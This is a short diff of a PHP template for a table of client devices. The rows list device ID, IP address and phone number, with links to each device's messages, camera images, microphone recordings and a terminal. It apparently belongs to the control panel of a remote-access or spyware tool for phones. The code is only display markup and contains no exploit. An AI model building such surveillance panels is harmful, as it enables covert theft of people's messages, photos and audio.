@@ -21,17 +21,17 @@
                     <?php foreach($clients as $client): ?>
                       <tr>
                           <td><?= $client->getModel(); ?></td>
-                          <td><?= $client->getModel(); ?></td>
-                          <td><?= $client->getModel(); ?></td>
-                          <td><?= $client->getModel(); ?></td>
-                          <td><?= $client->getModel(); ?></td>
+                          <td><?= $client->getDeviceID(); ?></td>
+                          <td><?= $client->getIPAddress(); ?></td>
+                          <td><?= $client->getDeviceAPI(); ?></td>
+                          <td><?= $client->getPhone(); ?></td>
                           <td class="text-end">
-                              <button id="btn-sms" class="btn btn-outline-danger btn-rounded"><i class="fas fa-sms"></i></button>
-                              <button id="btn-phone" class="btn btn-outline-success btn-rounded"><i class="fas fa-phone"></i></button>
-                              <button id="btn-settings" class="btn btn-outline-secondary btn-rounded"><i class="fas fa-cog"></i></button>
-                              <button id="btn-camera" class="btn btn-outline-primary btn-rounded"><i class="fas fa-camera"></i></button>
-                              <button id="btn-mic" class="btn btn-outline-info btn-rounded"><i class="fas fa-microphone"></i></button>
-                              <button id="btn-terminal" class="btn btn-outline-dark btn-rounded"><i class="fas fa-terminal"></i></button>
+                              <a target="_blank" href="/messages?client=<?= $client->getID(); ?>" id="btn-sms" class="btn btn-outline-danger btn-rounded"><i class="fas fa-sms"></i></a>
+                              <a target="_blank" id="btn-phone" class="btn btn-outline-success btn-rounded"><i class="fas fa-phone"></i></a>
+                              <a target="_blank" id="btn-settings" class="btn btn-outline-secondary btn-rounded"><i class="fas fa-cog"></i></a>
+                              <a target="_blank" href="/images?client=<?= $client->getID(); ?>" id="btn-camera" class="btn btn-outline-primary btn-rounded"><i class="fas fa-camera"></i></a>
+                              <a target="_blank" href="/recordings?client=<?= $client->getID(); ?>" id="btn-mic" class="btn btn-outline-info btn-rounded"><i class="fas fa-microphone"></i></a>
+                              <a target="_blank" id="btn-terminal" class="btn btn-outline-dark btn-rounded"><i class="fas fa-terminal"></i></a>
                           </td>
                       </tr>  
                     <?php endforeach ?>
